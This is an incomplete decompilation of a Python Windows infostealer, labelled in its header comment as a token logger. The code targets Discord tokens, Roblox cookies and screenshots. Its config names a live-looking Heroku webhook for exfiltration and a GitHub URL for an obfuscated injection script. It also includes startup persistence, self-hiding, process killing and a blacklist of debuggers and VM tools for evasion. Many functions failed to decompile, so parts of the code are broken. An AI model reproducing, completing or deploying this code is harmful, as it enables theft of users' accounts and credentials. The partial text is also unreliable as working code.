!!!WARNING: Decompyle incomplete!!! -Marci(as u can see thats a token logger)
############################################
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: DICT_MERGE
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
############################################
import os
import json
import httpx
import winreg
import ctypes
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
config = {
    'webhook': 'https://warm-gorge-91385.herokuapp.com',
    'webhook_protector_key': 'FFL4HCJ6DPB3SL6CSVXSM===',
    'injection_url': 'https://raw.githubusercontent.com/mrhnpjs/nw-indx.js/main/obf-inj.js',
    'kill_processes': True,
    'startup': True,
    'hide_self': True,
    'blackListedPrograms': [
        'httpdebuggerui',
        'wireshark',
        'fiddler',
        'regedit',
        'cmd',
        'taskmgr',
        'vboxservice',
        'df5serv',
        'processhacker',
        'vboxtray',
        'vmtoolsd',
        'vmwaretray',
        'ida64',
        'ollydbg',
        'pestudio',
        'vmwareuser',
        'vgauthservice',
        'vmacthlp',
        'x96dbg',
        'vmsrvc',
        'x32dbg',
        'vmusrvc',
        'prl_cc',
        'prl_tools',
        'xenservice',
        'qemu-ga',
        'joeboxcontrol',
        'ksdumperclient',
        'ksdumper',
        'joeboxserver'] }
Victim = os.getlogin()
Victim_pc = os.getenv('COMPUTERNAME')

class functions(object):
    
    def getHeaders(token = None):
        headers = {
            'Content-Type': 'application/json' }
        if token:
            headers.update({
                'Authorization': token })
            return headers

    getHeaders = None(getHeaders)
    
    def get_master_key(path = None):
        with open(path, 'r', 'utf-8', **('encoding',)) as f:
            c = f.read()
            None(None, None, None)
    # WARNING: Decompyle incomplete

    get_master_key = None(get_master_key)
    
    def decrypt_val(buff = None, master_key = None):
        pass
    # WARNING: Decompyle incomplete

    decrypt_val = None(decrypt_val)
    if not str:
        
        def fetchConf(e = None):
            return config.get(e)

        fetchConf = None(fetchConf)
        return None


class GetPizzas(functions):
    
    def __init__(self):
        self.webhook = self.fetchConf('webhook')
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        self.regex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\"]*'
        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        os.makedirs(self.dir, True, **('exist_ok',))

    
    def try_extract(func):
        
        def wrapper(*args, **kwargs):
            pass
        # WARNING: Decompyle incomplete

        return wrapper

    
    async def checkToken(self = None, tkn = None):
        pass
    # WARNING: Decompyle incomplete

    
    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [
            self.screenshot,
            self.grabTokens,
            self.grabRobloxCookie]
    # WARNING: Decompyle incomplete

    
    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    
    def startup(self):
        pass
    # WARNING: Decompyle incomplete

    
    async def injector(self):
        pass
    # WARNING: Decompyle incomplete

    
    async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
    # WARNING: Decompyle incomplete

    
    async def bypassTokenProtector(self):
        tp = f'''{self.roaming}\\DiscordTokenProtector\\'''
        if not os.path.exists(tp):
            return None
        config = None + 'config.json'
    # WARNING: Decompyle incomplete

    
    async def bypassBetterDiscordUnsupported opcode: WITH_EXCEPT_START
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH
